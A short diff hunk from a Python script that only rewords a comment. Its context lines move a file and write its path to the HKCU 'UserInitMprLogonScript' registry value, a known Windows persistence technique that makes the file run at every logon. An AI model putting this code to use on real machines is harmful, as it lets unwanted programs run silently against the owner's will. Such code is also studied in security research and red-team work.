@@ -15,7 +15,7 @@ shutil.move(filepath, filedir)
 reghive = winreg.HKEY_CURRENT_USER
 regpath = "Environment"
 
-# writing the regkey to the Logon script registry
+# writing the regkey to create a logon script
 reg = winreg.ConnectRegistry(None, reghive)
 key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
 winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, filepath)
